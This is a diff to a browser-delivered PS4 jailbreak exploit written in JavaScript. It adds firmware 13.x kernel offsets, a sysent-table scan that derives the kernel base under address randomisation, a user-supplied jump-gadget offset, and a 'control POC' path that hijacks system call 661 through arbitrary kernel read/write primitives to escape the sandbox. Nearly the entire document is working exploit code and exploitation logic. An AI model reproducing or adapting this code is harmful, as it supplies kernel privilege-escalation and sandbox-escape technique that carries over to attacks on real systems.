@@ -118,7 +118,7 @@ html, body {
 // ========== SHARED CONFIG ==========
 var Q = new URLSearchParams(location.search);
 
-var REVISION = "genuine-u8-rw-12-1352";
+var REVISION = "genuine-u8-rw-14-1352";
 var headerMsg = "mansoor0x";
 
 var MAX_ATTEMPTS = (function(){
@@ -133,20 +133,22 @@ var DRAIN_COUNT = (function(){
     return Math.max(32, Math.min(512, v));
 })();
 
+var SIMPLE_JB = Q.get("simplejb") !== "0";
 var CARRIER_SLOTS = (function(){
-    var v = parseInt(Q.get("c") || "800000", 10);
-    if (!isFinite(v)) v = 800000;
+    var def = SIMPLE_JB ? "2000000" : "800000";
+    var v = parseInt(Q.get("c") || def, 10);
+    if (!isFinite(v)) v = parseInt(def, 10);
     return Math.max(100000, Math.min(4000000, v));
 })();
 var RUN_JAILBREAK = Q.get("jb") === "1" && Q.get("l") !== "1";
 var KERNEL_LAB = Q.get("klab") === "1";
-var SIMPLE_JB = Q.get("simplejb") !== "0";
 var MEM_DROP_AFTER_RW = Q.get("mem") === "drop";
 var RUN_KERNEL_STAGE = RUN_JAILBREAK || KERNEL_LAB;
 var FORCE_UCRED_SIG_SCAN = Q.get("ksig") === "1";
 var JB_DELAY_MS = (function(){
-    var v = parseInt(Q.get("jbdelay") || "7500", 10);
-    if (!isFinite(v)) v = 7500;
+    var def = SIMPLE_JB ? "500" : "7500";
+    var v = parseInt(Q.get("jbdelay") || def, 10);
+    if (!isFinite(v)) v = parseInt(def, 10);
     return Math.max(500, Math.min(30000, v));
 })();
 var SURVIVE_MS = (function(){
@@ -383,8 +385,17 @@ var PS4_OFFSETS = {
     "13.02": { evf: 0x784798, prison0: 0x111FA18, rootvnode: 0x2136E90, sysent: 0x110A760, jmp: 0x47B31, allproc: 0x1B28538 },
     "13.04": { evf: 0x784798, prison0: 0x111FA18, rootvnode: 0x2136E90, sysent: 0x110A760, jmp: 0x47B31, allproc: 0x1B28538 },
     "13.50": { evf: 0x784798, prison0: 0x111FA18, rootvnode: 0x2136E90, sysent: 0x110A760, jmp: 0x47B31, allproc: 0x1B28538, allprocMx: 0x2485EF0 },
-    "13.52": { evf: 0x784798, prison0: 0x111FA18, rootvnode: 0x2136E90, sysent: 0x110A760, jmp: 0x4D6D0, allproc: 0x1B28538, allprocMx: 0x2485EF0 }
+    "13.52": { evf: 0x784798, prison0: 0x111FA18, rootvnode: 0x2136E90, sysent: 0x110A760, jmp: 0x47B31, allproc: 0x1B28538, allprocMx: 0x2485EF0 }
 };
+
+function firmwareJmpOffset() {
+    var raw = Q.get("jmp");
+    if (raw) {
+        var j = parseInt(String(raw).replace(/^0x/i, ""), 16);
+        if (isFinite(j) && j > 0) return j;
+    }
+    return fwOffsets.jmp;
+}
 
 // ========== PARAMETERS ==========
 var LITE = Q.get("l") === "1";
@@ -529,29 +540,96 @@ function probeKernelBase(kbase, sysentOff, prison0Off) {
 }
 
 function probeKernelBaseLoose(kbase, sysentOff) {
+    return probeSysent661LooseAt(kbase + BigInt(sysentOff), kbase);
+}
+
+function probeSysent661LooseAt(seAddr, kbaseHint) {
     try {
-        var se = kbase + BigInt(sysentOff);
+        var se = BigInt(seAddr);
         var narg = read64(se) & 0xFFFFFFFFn;
-        if (narg > 8n) return false;
+        if (narg > 12n) return false;
         var call = read64(se + 8n);
         if (!kptrBig(call)) return false;
-        if (call < kbase || call > kbase + 0x2000000n) return false;
+        if (kbaseHint !== null && kbaseHint !== undefined) {
+            var kb = BigInt(kbaseHint);
+            if (call < kb || call > kb + 0x4000000n) return false;
+        } else if (call < 0xffffffff80000000n) return false;
         var thr = read64(se + 0x2Cn) & 0xFFFFFFFFn;
-        return thr <= 0x10000n;
+        return thr <= 0x100000n;
     } catch (_) {
         return false;
     }
 }
 
-function markSysentProbe(kbase, sysentOff) {
+function deriveKbaseFromSysentVa(seAddr, sysentOff) {
+    return BigInt(seAddr) - BigInt(sysentOff);
+}
+
+function findSysent661Absolute(sysentOff, prison0Off) {
+    var sysentBig = BigInt(sysentOff);
+    var scanStart = KBASE_DEFAULT + sysentBig;
+    var scanEnd = KBASE_DEFAULT + sysentBig + KBASE_SLIDE_MAX;
+    var step = 0x4000n;
+    var best = null;
+    for (var se = scanStart; se < scanEnd; se += step) {
+        var kb = se - sysentBig;
+        if (probeSysent661LooseAt(se, kb)) {
+            var strict = false;
+            try {
+                var pr = read64(kb + BigInt(prison0Off));
+                strict = kptrBig(pr);
+            } catch (_) {}
+            var hit = { se: se, kb: kb, strict: strict, loose: true };
+            mark("SYSENT-VA-HIT", "se=" + hex(se) + "-kb-derived=" + hex(kb) + "-strict=" + strict);
+            return hit;
+        }
+    }
+    var offSlack = 0x80000n;
+    for (var delta = -offSlack; delta <= offSlack; delta += 0x10000n) {
+        var se2 = scanStart + delta;
+        var kb2 = se2 - sysentBig;
+        if (probeSysent661LooseAt(se2, kb2)) {
+            mark("SYSENT-VA-HIT", "se=" + hex(se2) + "-kb-derived=" + hex(kb2) + "-off-delta=" + hex(delta));
+            return { se: se2, kb: kb2, strict: false, loose: true };
+        }
+    }
+    return best;
+}
+
+function sampleKernelReads(sysentOff) {
+    var samples = [];
+    function add(tag, addr) {
+        try {
+            var v = read64(addr);
+            samples.push(tag + "=" + hex(v));
+        } catch (e) {
+            samples.push(tag + "=err");
+        }
+    }
+    if (isFinite(hostAddress)) add("user-host", BigInt(Math.floor(hostAddress)));
+    if (isFinite(targetAddress)) add("user-target", BigInt(Math.floor(targetAddress)));
+    var se0 = KBASE_DEFAULT + BigInt(sysentOff);
+    add("kern-se-default", se0);
+    add("kern-se+slide1m", se0 + 0x100000n);
+    add("kern-se+slide2m", se0 + 0x200000n);
+    mark("KERNEL-READ-SAMPLES", samples.join("-"));
+    return samples;
+}
+
+function markSysentProbeAt(seAddr, kbaseForTag) {
     try {
-        var se = kbase + BigInt(sysentOff);
+        var se = BigInt(seAddr);
         var narg = read64(se) & 0xFFFFFFFFn;
         var call = read64(se + 8n);
-        mark("SYSENT-PROBE", "narg=" + narg + "-call=" + hex(call) + "-loose=" + probeKernelBaseLoose(kbase, sysentOff));
+        var kb = kbaseForTag !== undefined ? BigInt(kbaseForTag) : deriveKbaseFromSysentVa(se, fwOffsets.sysent);
+        mark("SYSENT-PROBE", "se=" + hex(se) + "-narg=" + narg + "-call=" + hex(call) + "-loose=" + probeSysent661LooseAt(se, kb));
     } catch (e) {
         mark("SYSENT-PROBE", "err=" + e.message);
     }
+}
+
+function markSysentProbe(kbase, sysentOff) {
+    markSysentProbeAt(kbase + BigInt(sysentOff), kbase);
 }
 
 function enumerateAllproc(kbase, allprocOff, max) {
@@ -596,39 +674,37 @@ function persistKernelBase(kb) {
     try { sessionStorage.setItem("ps4lab_kernel_base", s); } catch (_) {}
 }
 
+function metaFromSysentHit(hit, tag) {
+    if (!hit) return null;
+    var r = finishKbaseResolve(hit.kb, fwOffsets.sysent, fwOffsets.prison0, tag + "-se=" + hex(hit.se));
+    return { kb: hit.kb, se: hit.se, located: true, loose: r.loose, strict: r.strict || hit.strict };
+}
+
 function resolveKernelBaseSync(sysentOff, prison0Off, done) {
     if (Q.get("kb")) {
         mark("KBASE-SRC", "query");
         var qkb = kernelBaseFromQuery();
         var r = finishKbaseResolve(qkb, sysentOff, prison0Off, "query");
-        done({ kb: r.kb, located: r.loose || r.strict, loose: r.loose, strict: r.strict });
+        done({ kb: r.kb, se: qkb + BigInt(sysentOff), located: r.loose || r.strict, loose: r.loose, strict: r.strict });
         return;
     }
     var stored = kernelBaseFromStorage();
     if (stored !== null && probeKernelBaseLoose(stored, sysentOff)) {
         mark("KBASE-SRC", "storage");
         var rs = finishKbaseResolve(stored, sysentOff, prison0Off, "storage");
-        done({ kb: rs.kb, located: true, loose: rs.loose, strict: rs.strict });
+        done({ kb: rs.kb, se: stored + BigInt(sysentOff), located: true, loose: rs.loose, strict: rs.strict });
         return;
     }
-    if (probeKernelBaseLoose(KBASE_DEFAULT, sysentOff)) {
-        mark("KBASE-SRC", "default-loose");
-        var rd = finishKbaseResolve(KBASE_DEFAULT, sysentOff, prison0Off, "default");
-        done({ kb: rd.kb, located: true, loose: rd.loose, strict: rd.strict });
+    mark("KBASE-SRC", "sysent-va-scan-no-prior-kbase");
+    var hit = findSysent661Absolute(sysentOff, prison0Off);
+    if (hit) {
+        var m = metaFromSysentHit(hit, "sysent-va");
+        done(m);
         return;
-    }
-    mark("KBASE-SRC", "slide-scan-sync");
-    for (var slide = 0n; slide < KBASE_SLIDE_MAX; slide += 0x4000n) {
-        var kb = KBASE_DEFAULT + slide;
-        if (probeKernelBaseLoose(kb, sysentOff)) {
-            var rf = finishKbaseResolve(kb, sysentOff, prison0Off, "slide=" + hex(slide));
-            done({ kb: rf.kb, located: true, loose: rf.loose, strict: rf.strict });
-            return;
-        }
     }
     mark("KBASE-FOUND", "none");
-    markSysentProbe(KBASE_DEFAULT, sysentOff);
-    done({ kb: KBASE_DEFAULT, located: false, loose: false, strict: false });
+    markSysentProbeAt(KBASE_DEFAULT + BigInt(sysentOff), KBASE_DEFAULT);
+    done({ kb: KBASE_DEFAULT, se: KBASE_DEFAULT + BigInt(sysentOff), located: false, loose: false, strict: false });
 }
 
 function resolveKernelBaseForStage(sysentOff, prison0Off, done) {
@@ -671,10 +747,17 @@ function resolveKernelBaseAsync(sysentOff, prison0Off, done) {
         }
         if (slide < KBASE_SLIDE_MAX) setTimeout(chunk, 0);
         else {
+            mark("KBASE-SRC", "sysent-va-scan-fallback");
+            var hit = findSysent661Absolute(sysentOff, prison0Off);
+            if (hit) {
+                var m = metaFromSysentHit(hit, "sysent-va-async");
+                done(m);
+                return;
+            }
             mark("KBASE-FOUND", "none");
-            mark("KBASE-WARN", "no-kbase-in-tree-leaks-use-kb=-or-kqueue-chain");
-            markSysentProbe(KBASE_DEFAULT, sysentOff);
-            done({ kb: KBASE_DEFAULT, located: false, loose: false, strict: false });
+            mark("KBASE-WARN", "sysent-VA-scan-missed-check-KERNEL-READ-SAMPLES");
+            markSysentProbeAt(KBASE_DEFAULT + BigInt(sysentOff), KBASE_DEFAULT);
+            done({ kb: KBASE_DEFAULT, se: KBASE_DEFAULT + BigInt(sysentOff), located: false, loose: false, strict: false });
         }
     }
     setTimeout(chunk, 0);
@@ -1302,45 +1385,72 @@ function write64(addr, value) {
 // ========== KERNEL LAB (R/W probe + kbase, no sysent hijack) ==========
 function runKernelLab() {
     mark("===== KERNEL-LAB START =====", "fw=" + FW_LABEL);
+    mark("KERNEL-LAB-NOTE", "scan-sysent-VA-first-kbase-is-derived-not-assumed");
     clearSurvivalMarks();
     compactLog(40);
     var sysent = fwOffsets.sysent;
     var prison0 = fwOffsets.prison0;
-    resolveKernelBaseForStage(sysent, prison0, function onKbase(meta) {
-        var kbase = meta.kb;
-        mark("KERNEL-BASE", hex(kbase) + (meta.located ? (meta.strict ? "-strict" : "-loose") : "-NOT-LOCATED"));
-        markSysentProbe(kbase, sysent);
+
+    sampleKernelReads(sysent);
+
+    var hit = findSysent661Absolute(sysent, prison0);
+    if (hit) {
+        markSysentProbeAt(hit.se, hit.kb);
         var prisonOk = false;
         try {
-            var pr = read64(kbase + BigInt(prison0));
+            var pr = read64(hit.kb + BigInt(prison0));
             prisonOk = kptrBig(pr);
             mark("KERNEL-READ-PRISON0", hex(pr) + "-ok=" + prisonOk);
         } catch (e) {
             mark("KERNEL-READ-PRISON0", "err=" + e.message);
         }
-        var rwOk = meta.located && prisonOk;
-        mark("KERNEL-RW-OK", rwOk ? "sysent-and-prison0-readable" : "failed-fix-kbase-or-primitive");
-        if (meta.located) persistKernelBase(kbase);
-        mark("KERNEL-LAB-DONE", "kb=" + hex(kbase) + "-next=jb.html?jb=1&kb=0x" + kbase.toString(16));
-    });
+        mark("KBASE-DERIVED", hex(hit.kb) + "-from-se=" + hex(hit.se));
+        mark("KERNEL-RW-OK", "sysent661-pattern-at-kernel-VA");
+        persistKernelBase(hit.kb);
+        mark("KERNEL-LAB-DONE", "kb=0x" + hit.kb.toString(16) + "-next=jb.html?jb=1");
+        return;
+    }
+
+    markSysentProbeAt(KBASE_DEFAULT + BigInt(sysent), KBASE_DEFAULT);
+    var seDefault = KBASE_DEFAULT + BigInt(sysent);
+    var nargD = 0n;
+    var callD = 0n;
+    try {
+        nargD = read64(seDefault) & 0xFFFFFFFFn;
+        callD = read64(seDefault + 8n);
+    } catch (_) {}
+    var anyKernelShape = kptrBig(callD) && nargD <= 12n;
+    mark("KERNEL-RW-PROBE", "default-se-narg=" + nargD + "-call=" + hex(callD) + "-shape=" + anyKernelShape);
+    if (anyKernelShape) {
+        var kbGuess = deriveKbaseFromSysentVa(seDefault, sysent);
+        mark("KBASE-DERIVED", hex(kbGuess) + "-weak-from-default-se");
+        mark("KERNEL-RW-OK", "loose-sysent-shape-at-default-VA-not-slide-verified");
+        persistKernelBase(kbGuess);
+        mark("KERNEL-LAB-DONE", "weak-kb=0x" + kbGuess.toString(16) + "-try-jb=1-or-check-KERNEL-READ-SAMPLES");
+    } else {
+        mark("KERNEL-RW-OK", "miss-no-sysent-pattern-kernel-VA-may-not-be-readable-from-webkit-RW");
+        mark("KERNEL-LAB-DONE", "compare-KERNEL-READ-SAMPLES-vs-user-host-same=primitive-not-reaching-kernel");
+    }
 }
 
-// Reference POC path: fixed flow, synchronous scan (Downloads/1350-webkit-test-main — control only).
+// Control POC path: fixed kbase 0xFFFFFFFF80000000, hijack first (Downloads/1350-webkit-test-main).
 function runJailbreakSimple(meta) {
-    mark("JB-MODE", "simple-reference-sync");
+    mark("JB-MODE", "control-poc-fixed-kbase");
     clearSurvivalMarks();
     compactLog(32);
     var evf = fwOffsets.evf;
     var prison0 = fwOffsets.prison0;
     var rootvnode = fwOffsets.rootvnode;
     var sysent = fwOffsets.sysent;
-    var jmp = fwOffsets.jmp;
-    var kbase = meta && meta.kb ? meta.kb : KBASE_DEFAULT;
-    if (meta && meta.located) persistKernelBase(kbase);
+    var jmp = firmwareJmpOffset();
+    var kbase = KBASE_DEFAULT;
+    if (Q.get("kb")) {
+        var qkb = kernelBaseFromQuery();
+        if (qkb !== null) kbase = qkb;
+    }
 
     try {
-        mark("KERNEL-BASE", hex(kbase) + (meta && meta.located ? "-located" : "-assumed-default"));
-        markSysentProbe(kbase, sysent);
+        mark("KERNEL-BASE", hex(kbase));
 
         var sysent_661 = kbase + BigInt(sysent);
         var jmp_rsi = kbase + BigInt(jmp);
@@ -1350,7 +1460,6 @@ function runJailbreakSimple(meta) {
         var sy_narg = Number(read64(sysent_661) & 0xFFFFFFFFn);
         var sy_call = read64(sysent_661 + 8n);
         var sy_thrcnt = Number(read64(sysent_661 + 0x2Cn) & 0xFFFFFFFFn);
-        mark("KERNEL-RW-OK", "sysent661-read-narg=" + sy_narg + "-call=" + hex(sy_call));
 
         if (Q.get("khij") === "0") {
             mark("SYSENT-HIJACK-SKIP", "khij=0");
@@ -1457,6 +1566,11 @@ function runJailbreak() {
     clearSurvivalMarks();
     compactLog(48);
 
+    if (SIMPLE_JB) {
+        runJailbreakSimple(null);
+        return;
+    }
+
     var evf = fwOffsets.evf;
     var prison0 = fwOffsets.prison0;
     var rootvnode = fwOffsets.rootvnode;
@@ -1466,10 +1580,6 @@ function runJailbreak() {
     var skipKhij = Q.get("khij") === "0";
 
     resolveKernelBaseForStage(sysent, prison0, function onKbase(meta) {
-        if (SIMPLE_JB) {
-            runJailbreakSimple(meta);
-            return;
-        }
         runJailbreakWithKbase(meta);
     });
 
